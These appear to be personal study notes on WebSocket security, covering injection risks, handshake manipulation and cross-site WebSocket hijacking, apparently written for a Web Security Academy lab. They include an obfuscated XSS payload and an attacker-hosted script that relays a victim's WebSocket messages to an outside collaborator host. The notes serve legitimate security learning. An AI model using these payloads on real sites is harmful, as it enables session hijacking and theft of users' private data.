* User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection [[SQLi]] #xml 
* Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques.
* If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.

##### Manipulating handshake
* Misplaced trust in HTTP headers to perform security decisions, such as the `X-Forwarded-For` header [[Exploit headers vulns]]
* Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message
* Attack surface introduced by custom HTTP headers used by the application

##### [[XSS]] obfuscating
#encoding 
```js
<img src='x' OnErEoR='alert`1`' />"
```

##### Cross-site WebSocket hijacking (CSWSH)
Essentially it is [[CSRF]] on a WebSocket handshake.

* Perform unauthorized actions masquerading as the victim user.
* Retrieve sensitive data that the user can access.
* Just wait for incoming messages to arrive containing sensitive data.
	
Example of vulnerable request without CSRF token, only session is required.
```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

The `Sec-WebSocket-Key` header contains a random value to prevent errors from caching proxies.
Host on attackers machine:
```html
<script>
    var ws = new WebSocket('wss://0a40006403bd192e806903bf000e009d.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://cvb0pjkci2e0ioc7j5pi4d1ygpmga7yw.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
